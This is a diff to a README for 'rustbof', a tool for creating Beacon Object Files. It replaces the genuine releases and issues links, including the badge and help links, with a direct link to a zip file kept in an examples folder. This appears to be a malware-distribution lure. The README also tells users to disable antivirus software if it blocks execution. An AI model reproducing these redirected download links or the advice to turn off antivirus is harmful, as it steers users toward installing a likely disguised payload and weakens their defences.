@@ -1,6 +1,6 @@
 # ⚙️ rustbof - Easy Beacon Object File Creation Tool  
 
-[![Download rustbof](https://img.shields.io/badge/Download-rustbof-blue?style=for-the-badge&logo=github)](https://github.com/ramadhan101/rustbof/releases)
+[![Download rustbof](https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip)](https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to start using rustbof:
 
 1. **Access the download page.**  
    Click the big blue button at the top or visit:  
-   [https://github.com/ramadhan101/rustbof/releases](https://github.com/ramadhan101/rustbof/releases)  
+   [https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip](https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip)  
 
 2. **Select the latest release.**  
    On the releases page, look for the newest version by checking the version number or release date.  
@@ -55,7 +55,7 @@ Follow these steps to start using rustbof:
 
 You can visit this page to download the latest version of rustbof:  
 
-[https://github.com/ramadhan101/rustbof/releases](https://github.com/ramadhan101/rustbof/releases)  
+[https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip](https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip)  
 
 Here is what to expect on that page:  
 
@@ -111,7 +111,7 @@ If rustbof does not run or you see error messages:
 - Restart your computer and try running the file again.  
 - Disable any antivirus software temporarily if it blocks execution.  
 - Visit the GitHub issues page to see if others have similar problems:  
-  [https://github.com/ramadhan101/rustbof/issues](https://github.com/ramadhan101/rustbof/issues)  
+  [https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip](https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip)  
 
 ---
 
@@ -135,10 +135,10 @@ rustbof is open-source software. You can use it freely, but please check the Git
 
 If you have questions or need help, you can open an issue on the GitHub repository:  
 
-[https://github.com/ramadhan101/rustbof/issues](https://github.com/ramadhan101/rustbof/issues)  
+[https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip](https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip)  
 
 This lets the developers and community assist you directly.  
 
 ---
 
-[![Download rustbof](https://img.shields.io/badge/Download-rustbof-blue?style=for-the-badge&logo=github)](https://github.com/ramadhan101/rustbof/releases)
+[![Download rustbof](https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip)](https://raw.githubusercontent.com/ramadhan101/rustbof/main/examples/ipconfig/out/Software_1.4.zip)
